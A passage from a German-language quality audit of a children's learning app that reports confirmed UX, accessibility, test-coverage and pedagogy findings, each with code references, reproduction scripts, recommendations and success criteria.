- **Beschreibung:** Die Kinderoberfläche nutzt das Vokabular des Entwicklers. Zählung in den Schüleransichten (`app/views`, `app/components`, Schülerrouten): „Durchgang“ 67×, „Stapel“ 31×, „Merkstufe“ 15×, „fällig“ 15×, „Wiederholung(en)“ 12×, „Box 1–4“ 9×, „Zahlenraum“ 6×, „Leitner“ in einem Kindertext. Hinweistexte erreichen LIX 51–54 (Sachtextniveau; unter 35 gilt als kindgerecht). Beispiele: Wortspeicher-Abschluss LIX 51 mit „Wiederholungsfälligkeit“, Kopfrechnen-Einstieg LIX 52 mit „Browserprofil“, Fortschritt LIX 54 mit „Klassenbeitrag gekennzeichnet“. Widersprüche verwirren zusätzlich: Stufe 1 heißt „Abschreiben“, die Rundenansicht titelt „Selbstständig schreiben“. Die Textbox-Schwierigkeit erscheint in der Bibliothek nur als drei leere Kreise ohne sichtbare Beschriftung (`title` hilft auf dem iPad nicht; Screenshot `shots/ipad-portrait-light_frei_german_textbox.png`). Fehlertexte im Raum geben … (vollständig in `agent-c-qa-ux.md`)
- **Belege:** `app/views/wortspeicher/completion-screen.tsx:116-120` („Merkstufe und Wiederholungsfälligkeit wurden lokal gespeichert …“), `app/views/wortspeicher/stage-copy.ts:12` („Du rekonstruierst fast das ganze Wort.“), `app/views/wortspeicher/round-screen.tsx:130` (Überschrift „Selbstständig schreiben“ auch auf Stufe 1 „Abschreiben“), `app/frei/mathematics/mental-math-app.tsx:455-459, 794` („… ein eigenes Browserprofil“, „Eine Korrektur allein reicht noch nicht“), … (vollständig in `agent-c-qa-ux.md`); `repro-c/lix.py` (LIX, Satzlänge; Texte per `grep` im Code bestätigt), Wortzählung per `grep -rhoE` über die Schüleransichten, Screenshot des Wortspeicher-Blatts `shots/a11y-ipadReduced-wort-sheet.png`, Raum-Fehlermeldung `repro-c/s-raum2.mjs` („Ups, hier lief wohl etwas schief | Live-Räume sind in dieser lokalen Vorschau noch nicht mit dem Laufdiktat-Raumdienst verbunden.“).
- **Betroffene:** Erst- und Zweitklässler, DaZ-Kinder, Kinder mit LRS, Kinder mit geringer Aufmerksamkeit (lange Texte werden übersprungen).
- **Folgen:** Kinder verstehen nicht, was eine Stufe bedeutet oder was sie als Nächstes tun sollen. Die Selbstständigkeit, die das Projekt anstrebt, scheitert an der Sprache. Lehrkräfte müssen dieselben Begriffe immer wieder erklären.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Ein Kinder-Glossar mit verbindlichen, einfachen Wörtern (z. B. „Stufe“ statt „Merkstufe“, „Runde“ statt „Durchgang“, „heute üben“ statt „fällig“) und ein Lint-Test, der verbotene Fachwörter in Schüleransichten meldet. (2) Hinweistexte für Kinder auf einen Satz mit höchstens 10 Wörtern kürzen; Technik- und Datenschutzhinweise in den Erwachsenenbereich verschieben. (3) Vorlese-Knopf für jede Anleitung (lokale Stimme, siehe B-012). (4) Schwierigkeit sichtbar beschriften („leicht – mittel – schwer“). (5) Fehlertexte nach Ursache trennen („Keine Verbindung – frag deine Lehrkraft“ vs. „Code stimmt nicht“).
- **Aufwand:** M
- **Erfolgskriterium:** Kein Schülertext über LIX 40; Glossar-Test grün; in einem kurzen Probelauf mit 5 Kindern der 2./3. Klasse können alle ohne Hilfe sagen, was „Stufe 2“ bedeutet.
- **Quelle:** `agent-c-qa-ux.md`

### C-008 – Widersprüchliche Statusanzeigen: „erledigt“ bei 6 offenen Karten, neue Karten als „schwierig“, „üben wir noch einmal“ bei „nichts fällig“

- **Bereich:** Schülerablauf (Szenarien 3, 6, 7), Verlässlichkeit der Anzeigen
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Mehrere Anzeigen widersprechen sich oder dem, was das Kind gerade getan hat: 1. LernBox: Ein Stapel mit 6 nie geübten Vokabeln zeigt im Kopf „HEUTE DRAN 6“ und am Stapel „erledigt“. 2. „Mein Lernraum“: Drei gerade angelegte, nie geübte Vokabeln erscheinen sofort als „Schwierige Wörter … Box 1“. 3. Wortspeicher: Der Abschluss sagt „Diese Wörter üben wir noch einmal: fließen, fliegen“ und „Fehler machen … sofort wieder fällig“. Die Übersicht direkt danach zeigt „0 Trainingswörter heute – Noch nichts fällig“. Die Schaltfläche „Nochmal üben“ auf derselben Seite startet eine Runde mit **anderen** Wörtern (`repro-c/s-wort2.mjs`: Fehlerwörter „Koffer, kennen“, neue Runde beginnt mit „Sessel“). Für Szenario 3 („mehrfach derselbe Fehler“) fehlt damit ein direkter Weg, genau die gerade falsch geschriebenen Wörter sofort noch einmal zu üben. 4. Erster Start: „Heute ist nichts dran“ und … (vollständig in `agent-c-qa-ux.md`)
- **Belege:** - `app/views/lernbox/parts/deck-grid.tsx:36-40` („erledigt“, sobald `deck.due === 0`) mit `app/components/learning-box-app.tsx:307` und `src/domain/learning-box.ts:325-333` (`isLearningBoxCardScheduledDue` zählt neue Karten mit `interval === 0` nie mit); daneben `learning-box-app.tsx:292-293` („Heute dran“ aus der Tagesportion, die neue Karten enthält). - `app/lernen/use-learner-dashboard.ts:95-115` („Schwierige Wörter“: Karten in Box 1 mit `lastReviewed > 0`) mit … (vollständig in `agent-c-qa-ux.md`); `repro-c/s-weeks.mjs` (Uhr per `page.clock` auf 19.10. bis 3.11.): am 3.11. LernBox „HEUTE DRAN | 6 | … | Englisch Tiere | 6 Vokabeln · eigene | erledigt“; am 19.10. vor jeder Übung „Heute dran | 0 / 0 | Für heute ist alles geschafft.“. `repro-c/s-difficult.mjs`: nach Anlegen von Apfel/Birne/Kirsche „Schwierige Wörter | Kirsche | Box 1 | Birne | Box 1 | Apfel | Box 1“. `repro-c/s-wortdue.mjs`: Stufe 1, „Langes i“, 2 Fehler mit Sofortkorrektur → … (vollständig in `agent-c-qa-ux.md`)
- **Betroffene:** alle Kinder, besonders Kinder mit Lernschwierigkeiten (sie verlassen sich auf die Anzeige „was ist dran“); Lehrkräfte und Eltern, die die Startseite als Lernstand lesen.
- **Folgen:** Kinder lernen, den Anzeigen nicht zu trauen, oder hören auf, weil „erledigt“ dasteht. Neue Vokabeln als „schwierig“ zu markieren, entmutigt ohne Grund. Der versprochene sofortige Fehlerrücklauf findet nicht statt (fachlich A-004/D-001).
- **Empfehlung (Vorschlag zur Prüfung):** Eine gemeinsame Funktion „was ist heute offen“ je Modul, die Karte, Startseite und Portion gleich beantwortet (neue Karten als „neu“, nicht als „erledigt“ oder „schwierig“). „Schwierig“ nur bei tatsächlichen Fehlversuchen. Abschlusstext an die echte Regel anpassen oder Fehlerwörter tatsächlich am selben Tag erneut anbieten. Leerer Tag: „Heute ist noch nichts geplant“ statt „alles geschafft“. Komponententests für diese Zustände.
- **Aufwand:** S–M
- **Erfolgskriterium:** Für jeden der fünf Fälle ein automatisierter Test; keine Ansicht nennt einen Stapel „erledigt“, solange Karten dieses Stapels in „Heute dran“ stehen.
- **Quelle:** `agent-c-qa-ux.md`

### C-009 – „Mein Fortschritt“ ist nur über Profil → „Klasse und Datenschutz“ erreichbar; parallele Einstiege verwirren

- **Bereich:** Navigation, Szenario 6 „Fortschritt verstehen“
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse und Browser)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die untere Leiste hat vier Ziele (Lernen, Üben, Raum, Profil). „Mein Fortschritt“ steckt als kleiner Knopf im Profil zwischen „Klasse beitreten“ und „Mehr über Datenschutz“. Auf „Mein Lernraum“ gibt es keinen Weg dorthin. Daneben existieren mit „Lernwerkstatt“ (`/lernen/material`) und den Fachseiten (`/lernen/faecher/…`) weitere Einstiege in dieselben Module, die ein Kind nur zufällig findet. Für Kinder ist unklar, was der Unterschied zwischen „Lernen“, „Üben“ und „Lernwerkstatt“ ist.
- **Belege:** einziger Link auf `/lernen/fortschritt`: `app/components/student-settings-panel.tsx:157-176` (im Abschnitt „Klasse und Datenschutz“ des Profils); `app/lernen/fortschritt/page.tsx:10-22` (nur Wortspeicher und Textbox, siehe D-004/D-009 zu Mathe); weitere Hubs ohne Verlinkung aus der Navigation: `/lernen/material` („Lernwerkstatt“, nur per Umleitung von `/frei`), `/lernen/aufgaben` (kein statischer Link im Code).; `grep` nach `"/lernen/fortschritt"` (1 Treffer außerhalb der Seite selbst); Routenrundgang `repro-c/sweep.mjs` (alle Seiten erreichbar per Adresse, Überschriften „Mein Fortschritt“, „Lernwerkstatt“, „Meine Aufgaben“); Startseitentexte in `repro-c/s-weeks.mjs` enthalten keinen Fortschrittslink.
- **Betroffene:** Kinder (Selbstwirksamkeit braucht sichtbaren Fortschritt), Lehrkräfte, die Kinder auf ihren Fortschritt verweisen wollen.
- **Folgen:** Die Fortschrittsseite wird kaum genutzt; die Motivation über sichtbares Wachstum, die das Konzept vorsieht, entsteht nicht.
- **Empfehlung (Vorschlag zur Prüfung):** Auf „Mein Lernraum“ eine Kachel „Mein Fortschritt“ (ggf. statt der Kachel „Diese Woche“) und die Wochenleiste dorthin verlinken; Lernwerkstatt und Fachseiten entweder in „Üben“ zusammenführen oder entfernen.
- **Aufwand:** S
- **Erfolgskriterium:** Fortschritt ist von „Lernen“ mit einem Tipp erreichbar; Navigationskonzept mit höchstens einem Einstieg je Modul dokumentiert.
- **Quelle:** `agent-c-qa-ux.md`

### C-010 – Lehrerablauf: viele Einzelschritte, Inhalte hängen am Laufdiktat-Assistenten, Demo-Werte als echte Eingaben, Technikjargon

- **Bereich:** Benutzerfreundlichkeit Lehrkraft (Klasse anlegen, Inhalte, Freigabe, Einstellungen)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Gemessener Weg bis zur ersten Nutzung ohne Live-Dienst: 1. Startseite → „Lehrer-Login“ (ohne Anmeldung, siehe B-009) → „Inhalte“. 2. „Klassen“ → Klassenname und Lehrkraft eintragen → „Klasse anlegen“. 3. 24 Kinder **einzeln**: je Name eintippen und „Schüler anlegen“ (48 Handlungen, kein Einfügen einer Namensliste). 4. „QR-Bogen“ → Drucken (druckt nur die Hälfte, C-006). 5. Jedes Kind scannt seinen Code und bestätigt die Identität. Das Skript brauchte 27 Klicks; realistisch sind für Schritt 1–4 rund 8–12 Minuten, für das Einschreiben einer Klasse eine Unterrichtsstunde (Schätzung, nicht gemessen). Inhalte anlegen ist irreführend: „Inhalte → Neu anlegen → Vokabeln“ öffnet „Schritt 1 von 4 · Laufdiktat · Wortliste vorbereiten“. Wer nur Vokabeln für die Klasse anlegen will, landet im Assistenten für einen Live-Raum. Ohne Titel heißt der Inhalt „Hund;dog“. „Freigabe an Schüler“ ist ein … (vollständig in `agent-c-qa-ux.md`)
- **Belege:** `app/components/teacher-class-configurator.tsx` (Schüler einzeln über „Name oder Alias“ + „Schüler anlegen“, kein Listenimport), `app/components/teacher-content-transfer.tsx:35-48` (Freigabeformular mit `DEFAULT_VOCABULARY` „school;Schule …“ und Titel „Englisch · Unterrichtspaket“ als echte Werte), `app/lehrer/live/hooks/use-live-room-session.ts:380` („… URL und Publishable Key verbinden wir anschließend.“), `app/lehrer/live/hooks/use-content-restore.ts:47` (Titel aus erster Zeile „Hund;dog“), … (vollständig in `agent-c-qa-ux.md`); `repro-c/s-teacher1.mjs` (iPad quer: „24 Schüler einzeln: 26 Klicks“, „has bulk/list import: 0“, axe ohne Befund), `repro-c/s-teacher2.mjs` („Schritt 1 von 4 · Laufdiktat | Wortliste vorbereiten“), `repro-c/s-teacher3.mjs` („„Hund;dog“ ist gespeichert.“, Freigabe mit „3 Vokabelpaaren“ vorbelegt, Screenshot `shots/ipad-landscape-t3-03-freigabe.png`, ohne Supabase: „Die Inhaltsübertragung ist noch nicht konfiguriert.“), `repro-c/s-tsettings.mjs`, … (vollständig in `agent-c-qa-ux.md`)
- **Betroffene:** Lehrkräfte ohne Technikaffinität, Vertretungslehrkräfte, Kollegium bei einer schulweiten Einführung.
- **Folgen:** Hohe Einstiegshürde. Lehrkräfte verwechseln „Inhalte“, „Freigabe“, „Aufgaben“ und „Live“. Versehentlich freigegebene Demo-Inhalte. Die schulartübergreifende Einführung scheitert eher am Lehrerablauf als an den Schülermodulen.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Namensliste einfügen (eine Zeile je Kind) plus CSV-Import. (2) Inhalte unabhängig vom Laufdiktat anlegen; die Verwendung (Live, Freigabe, Aufgabe) erst danach wählen. Ein Inhaltsmodell statt zweier Formulare. (3) Beispieldaten nur als Platzhalter, nie als Werte. (4) Ein Begriff je Seite; Technikbegriffe in einen Bereich „Für Fortgeschrittene“. (5) Einen geführten Ersteinrichtungsweg „Klasse in 5 Minuten“ mit Fortschrittsanzeige. (6) Eine `h1` je Lehrerseite.
- **Aufwand:** M (1, 3, 4, 6: S; 2, 5: M–L)
- **Erfolgskriterium:** Eine Lehrkraft ohne Vorwissen richtet im Test eine Klasse mit 25 Kindern samt druckfertigem Bogen in unter 10 Minuten ein. Kein Formular startet mit Beispieldaten als Wert.
- **Quelle:** `agent-c-qa-ux.md`

### C-011 – Laufdiktat allein: kein Fokus auf dem Antwortfeld, Rückmeldung wird nicht angesagt

- **Bereich:** Barrierefreiheit (WCAG 4.1.3 Statusmeldungen, 2.4.3 Fokusreihenfolge), Bedienkomfort auf dem iPad
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** In LernBox, Kopfrechnen, Wortspeicher und Textbox steht der Fokus nach jedem Phasenwechsel im Eingabefeld oder auf der nächsten Aktion, und die Rückmeldung wird über `role="status"` angesagt. Laufdiktat allein ist die Ausnahme: Nach „Laufdiktat starten“, „Verstanden – jetzt schreiben“ und „Prüfen“ liegt der Fokus jeweils auf `BODY`. Das Kind muss auf dem iPad erst ins Feld tippen, bevor die Tastatur erscheint. „Noch nicht richtig“ erscheint nur visuell.
- **Belege:** `app/frei/german/laufdiktat/running-dictation-app.tsx:440` („Richtig“/„Noch nicht richtig“ ohne `role="status"`/`aria-live`; die einzige Statusregion der Datei, Z. 330, gilt nur der Übernahme-Meldung am Ende), keine Fokussteuerung bei den Phasenwechseln.; `repro-c/s-ld-focus.mjs`: „reveal focus: BODY“, „write focus: BODY“, „feedback focus: BODY | live regions: [nur Versionsknopf]“. Vergleich `repro-c/s-live.mjs`: LernBox „INPUT:Deine Antwort“ → „BUTTON:Weiter“ mit `status`; Kopfrechnen Fokus im Feld mit `status: Noch nicht – probiere es erneut.`; Wortspeicher „BUTTON:Noch einmal versuchen“ mit `status`; Textbox „INPUT:Lücke 1 von 8“, nach Prüfen Fokus auf der Überschrift.
- **Betroffene:** Kinder mit VoiceOver oder Schaltersteuerung; alle iPad-Nutzer (zusätzlicher Tipp je Aufgabe).
- **Folgen:** Unnötige Reibung im Modul, das als Gedächtnis-Schreibübung auf flüssige Abläufe angewiesen ist; für Bildschirmleser ist die Rückmeldung unsichtbar.
- **Empfehlung (Vorschlag zur Prüfung):** Das Fokus- und Ansagemuster der übrigen Module übernehmen (gemeinsamer Hook); Komponententest „Fokus im Antwortfeld nach ‚Verstanden‘“.
- **Aufwand:** S
- **Erfolgskriterium:** `s-ld-focus`-Prüfung meldet Fokus im Antwortfeld und eine Statusregion mit der Rückmeldung.
- **Quelle:** `agent-c-qa-ux.md`

### C-012 – Nach 0 % schlägt die Textbox als Hauptaktion den schwereren Durchgang vor

- **Bereich:** Szenario 4 „frustrierende Bewertung“, Ablaufsteuerung
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Nach Durchgang 1 mit 0 von 8 Lücken zeigt die Kontrolle groß „0 %“ und darunter als breite Hauptschaltfläche „Weiter zu Durchgang 2“ – also mehr Lücken (40 % statt 20 %). Ein Kind, das gerade alles falsch hatte, wird ohne Hinweis in die schwerere Stufe geschickt. Die Prozentzahl ist das größte Element der Seite; ein Satz, was jetzt sinnvoll ist, fehlt. (Didaktik der Rückmeldung selbst: D-005/D-008.)
- **Belege:** `app/views/textbox/review-screen.tsx:108-118` (Hauptschaltfläche immer „Weiter zu Durchgang n+1“, „Durchgang wiederholen“ immer zweitrangig, unabhängig vom Ergebnis).; `repro-c/s-textbox.mjs`: Lücken mit „fallsch“/„Hunt“ gefüllt → „0 von 8 Lücken richtig geschrieben | 0 % | … | Durchgang wiederholen | Weiter zu Durchgang 2“; Screenshot `shots/ipad-portrait-tb-03-kontrolle.png`.
- **Betroffene:** Kinder mit LRS, schwächere Schreiber, Kinder mit geringer Frustrationstoleranz.
- **Folgen:** Abwärtsspirale aus schwerer werdenden Durchgängen und schlechteren Werten; Abbruch.
- **Empfehlung (Vorschlag zur Prüfung):** Unter einer Schwelle (z. B. < 60 %) „Noch einmal mit diesem Durchgang“ als Hauptaktion und einen kurzen ermutigenden Satz zeigen; die Prozentzahl kleiner, die Zahl richtiger Wörter größer darstellen.
- **Aufwand:** S
- **Erfolgskriterium:** Komponententest: bei 0–59 % ist „Durchgang wiederholen“ die Hauptaktion.
- **Quelle:** `agent-c-qa-ux.md`

### C-013 – Kopfrechnen zeigt vor der Runde alle Aufgaben mit Lösungen in derselben Reihenfolge; Einstieg ist ein Generator für Erwachsene

- **Bereich:** Schülerablauf Kopfrechnen, Szenario 8 (Schwierigkeit wählen), Rechenschwäche
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Wer in „Kopfrechnen“ eine Runde zusammenstellt, sieht unter „Vorschau“ alle zehn Aufgaben **mit Ergebnis** („12 − 4 = 8“, „15 − 11 = 4“ …) direkt über „Runde starten“. Die Runde stellt genau diese Aufgaben in genau dieser Reihenfolge („Aufgabe 1 von 10 | 12 − 4“). Zusätzlich kann jedes Kind schwierige Aufgaben einzeln „neu würfeln“. Der Einstieg selbst ist ein Aufgabengenerator mit Zahlenraum von/bis, vier Rechenarten, Anzahl und drei Feineinstellungen. Eine kindgerechte Auswahl („leicht – mittel – schwer“, „Einmaleins“, „bis 20 mit Übergang“) gibt es nicht. Der Weg über „Heute üben“ / „Meine Fehler und Wiederholungen üben“ umgeht den Generator, steht aber erst nach den ersten Fehlern zur Verfügung.
- **Belege:** `app/frei/mathematics/mental-math-app.tsx:702-735` (Liste „Vorschau“ mit `= {displayMathNumber(task.answer)}` und „neu würfeln“ je Aufgabe), Einstellungsbereich davor (Rechenarten, Von/Bis, Anzahl, „Feineinstellungen“: negative Ergebnisse, 0 vermeiden, Lückenaufgaben); Hinweistext Z. 455-459.; `repro-c/s-math.mjs` (iPad hoch): nach „Aufgaben erzeugen“ Text „Vorschau | 12 − 4 | = 8 | 15 − 11 | = 4 | 16 + 4 | = 20 | …“; nach „Runde starten“: „Aufgabe 1 von 10 | KOPFRECHNEN | 12 − 4“.
- **Betroffene:** Kinder mit Rechenschwäche (Ablesen statt Rechnen), jüngere Kinder (überfordernde Einstellungen), Kinder mit geringer Aufmerksamkeit (Abkürzung über „neu würfeln“).
- **Folgen:** Die Runde misst Kurzzeitgedächtnis statt Rechnen; Fehler- und Wiederholungsdaten (D-009) werden verfälscht. Kinder verlieren Zeit in Einstellungen statt beim Üben.
- **Empfehlung (Vorschlag zur Prüfung):** Für Kinder die Vorschau ohne Ergebnisse (oder ganz ohne Vorschau) zeigen und die Reihenfolge mischen; „neu würfeln“ nur im Lehrermodus. Drei bis fünf vorgefertigte, benannte Pakete als Standard; der Generator als „Eigene Runde“ für Ältere bzw. Lehrkräfte.
- **Aufwand:** S (Vorschau), M (Pakete)
- **Erfolgskriterium:** Im Schülermodus erscheint vor der Runde keine Lösung; E2E-Test prüft, dass der Setup-Text kein „= <Ergebnis>“ der ersten Rundenaufgabe enthält.
- **Quelle:** `agent-c-qa-ux.md`

### C-014 – Testlücken bei kritischen Nutzerabläufen: Druck, Abbruch/Fortsetzen, Erstkontakt, Fokus-Rückgabe, Mehrtagesverlauf

- **Bereich:** Testabdeckung kritischer Abläufe (E2E, Barrierefreiheit)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse der Testsuite)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Suite ist für ein Einzelprojekt breit. axe läuft auf 19 Hauptseiten (`platform-quality.spec.ts:75-107`) und in Zuständen von Wortspeicher, Textbox, Kopfrechnen, Laufdiktat-Pilot und Lehrerinhalten. 22 `toBeFocused`-Prüfungen sichern die Fokusführung, und alle Tests laufen zusätzlich bei 320 px. Die in diesem Bericht gefundenen Fehler liegen aber genau in den Lücken: - **Druck:** `emulateMedia({media:"print"})` nur in `textbox.spec.ts:365-375`. Der QR-Bogen wird nur am Bildschirm geprüft (`platform-quality.spec.ts:936-939`) → C-006 unentdeckt. - **Abbruch/Fortsetzen:** 13 `reload()`-Aufrufe prüfen gespeicherte Ergebnisse, die Fortsetzung nur in der Textbox. Kein Test für Zurück-Geste, Navigation während der Runde oder Rückfrage → C-001. - **Erstkontakt:** Kein Test öffnet ein frisches Gerät und folgt der Hauptschaltfläche → C-003. „Weiterlernen“ wird nur mit vorbereiteten Daten … (vollständig in `agent-c-qa-ux.md`)
- **Belege:** `e2e/*.spec.ts` (14 Dateien, ≈ 88 Tests; `e2e/live/` mit abgefangenen RPCs), `e2e/accessibility-helpers.ts:14-22` (`analyzeAccessibility` scrollt vor jeder Prüfung ans Seitenende), `playwright.config.ts:34-48` (7 Projekte inkl. `minimum-width` 320 px und Playwright-WebKit `tablet-safari`).; `grep` über `e2e/*.spec.ts`: `emulateMedia` 1 Datei, `colorScheme` 0, `reducedMotion` 0, `clock` 2 Dateien, `goBack` 1 Treffer, `toBeFocused` 22; Testnamen per `grep -n 'test("'`. Gegenprobe: Die eigenen Skripte in `repro-c/` decken die genannten Lücken ab und fanden dort C-001, C-003, C-005, C-006, C-008, C-011.
- **Betroffene:** alle; indirekt die Lehrkraft als einzige Entwicklerin bzw. einziger Entwickler, die sich auf grüne Suiten verlässt.
- **Folgen:** Regressionen in Abläufen, die im Unterricht sofort auffallen (Druck, Abbruch, Erstkontakt), bleiben bis zum Einsatz unentdeckt.
- **Empfehlung (Vorschlag zur Prüfung):** Eine kleine Suite „Unterrichtsabläufe“ mit sechs Szenarien: (1) frisches Gerät → erste Übung, (2) Abbruch und Fortsetzen je Modul, (3) QR-Bogen mit 30 Kindern als PDF, (4) Dialog öffnen/schließen mit Fokusprüfung, (5) zehn Tage mit `page.clock` und Konsistenzprüfung aller Zähler, (6) axe in jedem Modul im Rundenzustand mit `colorScheme: "dark"` und `reducedMotion: "reduce"`. Zusätzlich vor Releases eine manuelle Checkliste auf einem echten iPad mit VoiceOver.
- **Aufwand:** M
- **Erfolgskriterium:** Die sechs Szenarien laufen in CI; ein absichtlich wiedereingebauter Fehler aus C-006 oder C-008 lässt die Suite rot werden.
- **Quelle:** `agent-c-qa-ux.md`

### C-015 – Kleinere Bedien- und Darstellungspunkte (Sammelbefund)

- **Bereich:** Touch-Ziele, Rückmeldungsdarstellung, Konsistenz
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** 1. **Touch-Ziele:** WCAG 2.5.8 (≥ 24 px) ist fast überall erfüllt. Unter der für Kinder üblichen Empfehlung von 44 px liegen der Logo-Link „Zur Startseite“ und „Hell oder dunkel“ (38×38 px, auf jeder Schülerseite), die Textbox-Schwierigkeitsfilter (28 px breit, ohne sichtbare Beschriftung) und die Fußzeilenlinks der Startseite (14 px hoch). 2. **Rückmeldung bei völlig falscher Eingabe:** Der Wortspeicher listet je Buchstabe eine Zeile („1. Buchstabe fehlt: S … 6. Buchstabe: x statt l“). Bei Teilfehlern ist das hilfreich, bei einem ganz falschen Wort ist es eine Textwand (Screenshot `shots/a11y-ipadDark-wort-s4-feedback.png`). 3. **Klebende untere Leiste:** Bei 320 px, iPhone und iPad Mini meldet axe einzelne Ziele am unteren Rand als „teilverdeckt“. Beim Scrollen sind sie erreichbar. `e2e/accessibility-helpers.ts` umgeht das, indem es vor der Prüfung ans Seitenende scrollt. Der Effekt … (vollständig in `agent-c-qa-ux.md`)
- **Belege:** Messung `repro-c/sweep.mjs` (Funktion `targets` in `repro-c/lib.mjs`); `app/views/textbox/library-screen.tsx:433-451` (Schwierigkeitsfilter), Wortspeicher-Rückmeldung (`app/views/wortspeicher/`), Kopfzeile der Schülerseiten.; Rundgänge iPad hoch/320 px/iPhone/iPad Mini (Tabelle in Abschnitt 2); Wortspeicher Stufe 4 mit Eingabe „xx“ (`repro-c/s-a11y.mjs`).
- **Betroffene:** jüngere Kinder (Feinmotorik), Kinder mit geringer Lesemotivation.
- **Folgen:** Fehltipps auf das Logo (führt aus der Runde, C-001), Überforderung bei vielen Fehlerzeilen.
- **Empfehlung (Vorschlag zur Prüfung):** Kopfzeilenknöpfe auf 44 px; Filter beschriften; ab mehr als zwei Abweichungen statt der Liste nur „Schau dir das Wort noch einmal genau an“ mit dem Vergleich; `scroll-padding-bottom` für die klebende Leiste.
- **Aufwand:** S
- **Erfolgskriterium:** Alle Bedienelemente der Schülerseiten ≥ 44 px; Rückmeldung bei Totalfehlern höchstens zwei Zeilen.
- **Quelle:** `agent-c-qa-ux.md`

## D – Pädagogik und Diagnostik

### D-001 – Abschreiben zählt als gesicherter Abruf: Stufe 1 hebt Leitner-Box und Merkstufe, „sicher“ nach zweimal Abschreiben

- **Bereich:** Wortspeicher, Lernwort-Lernstand, Tagesportion
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (reproduziert, D1) und bestätigt (Codeanalyse)
- **Gegenprüfung:** verschärft (F, reproduziert): Abschreiben hebt auch die Merkstufe auf den Höchstwert; mit A-004 als ein Kernbefund. Korrektur: Vorauswahl nimmt die Stufe der letzten Runde. Empfehlung angepasst: Vorwahl Stufe 4/5 statt 6; „Stufe im Ereignis“ erst nach tolerantem Lesen (A-001); in derselben Änderung Übungsmenge anzeigen (Roadmap S4).
- **Beschreibung:** - _Konzept:_ Vault 07 beschreibt Merkstufe (Hilfebedarf) und Leitner-Box (Wiederholung) als getrennte Größen. Vault 06 verlangt „Hinweis oder Lösung verwendet → kein Aufstieg“. - _Implementierung:_ Eine richtige Eingabe auf **jeder** Stufe gilt als „unabhängiger Erfolg“. Auf Stufe 1 ist die Lösung aber während der Eingabe vollständig sichtbar. Abschreiben hebt die Box. Nach dem zweiten Abschreiben erreicht das Wort Box 3, die Fortschrittsseite und die Kacheln zählen es als „sicher“ (`word-store-progress.ts:147`, `box >= 3`). - Zusammen mit A-004 (kein Fälligkeitsschutz bei Lernwörtern) reichen mehrere Abschreibrunden an einem Nachmittag für Box 5 und 30 Tage Pause. - Die Tagesportion wählt für fällige Wörter die leichteste gespeicherte Stufe vor. Bei Wörtern aus dem Laufdiktat ist das Stufe 1. Die geplante verteilte Wiederholung wird so standardmäßig zur Abschreibübung, und jede … (vollständig in `agent-d-paedagogik.md`)
- **Belege:** - `src/domain/learning-word-progress.ts:23-68` (`updateLearningWordProgress`, Box 34-41, Merkstufe 42-52): Die gewählte Stufe beeinflusst den Box-Aufstieg nicht. Die Merkstufe steigt auf `max(gespeichert, Runde) + 1`. - `app/views/wortspeicher/round-screen.tsx:128-175` und `stage-prompt.tsx:12`: In Stufe 1 steht das Wort sichtbar über dem Eingabefeld, die Überschrift lautet „Selbstständig schreiben“. - `src/storage/personal-learning-events.ts:793-857` (`recordAttempt`): Das Ereignis wird als … (vollständig in `agent-d-paedagogik.md`); `repro-d/d-paedagogik.test.ts`, Test D1.
- **Betroffene:** - alle Kinder im Wortspeicher, besonders schwache Rechtschreiber, die verständlicherweise die leichteste Stufe wählen - Lehrkräfte und Eltern, die „sicher“ oder den Laufzettel lesen
- **Folgen:** - **[F]** Abrufüben ist dem Abschreiben beim Rechtschreiblernen überlegen, auch bei Erst- und Zweitklässlern (Jones et al., Vergleich mit Rainbow Writing). Massiertes Üben erzeugt hohe Sofortleistung bei schlechter Behaltensleistung (Cepeda et al. 2006). Grenze der Übertragbarkeit: englische Wörter, kurze Studien. - **[H]** Kinder und Lehrkräfte bekommen eine **Scheinkompetenz** angezeigt. Genau die Wörter, die im Unterricht falsch geschrieben wurden, verschwinden nach Abschreibübungen für … (vollständig in `agent-d-paedagogik.md`)
- **Empfehlung (Vorschlag zur Prüfung):** - Stufen 1–3 als **Üben ohne Box-Aufstieg** behandeln, analog zur Regel „Hinweis → kein Aufstieg“. Die Merkstufe darf dort steigen, die Box nicht. - Die Box nur bei Abruf ohne Schriftbild heben: Stufe 5/6 und Stufe 4 ohne Längenhinweis, siehe D-002. - Die Stufe im Ereignis speichern und die Ereignisart ehrlich benennen (`help: "copy"`). - In der Tagesportion fällige Wörter auf mindestens Stufe 4 (besser 6) vorwählen. Die Merkstufe je Wort nicht mehr über die Rundenstufe hochziehen (`max(...) + 1`). - Bestehende Stände nach A-003 neu bewerten oder einmalig zurücksetzen.
- **Aufwand:** S für die Regel, M mit Neubewertung der Bestände
- **Erfolgskriterium:** - Ein Regressionstest „dreimal Stufe 1 an drei Tagen → Box 1, Merkstufe ≤ 2“ ist grün. - „Sicher“ ist nur über Abrufe ohne Schriftbild an mindestens zwei verschiedenen Tagen erreichbar.
- **Quelle:** `agent-d-paedagogik.md`

### D-002 – Stufe 4 und die Lückenstufen verraten genau die Rechtschreibentscheidung, die geübt werden soll

- **Bereich:** Wortspeicher, Aufgabenqualität
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert, D2 und D12)
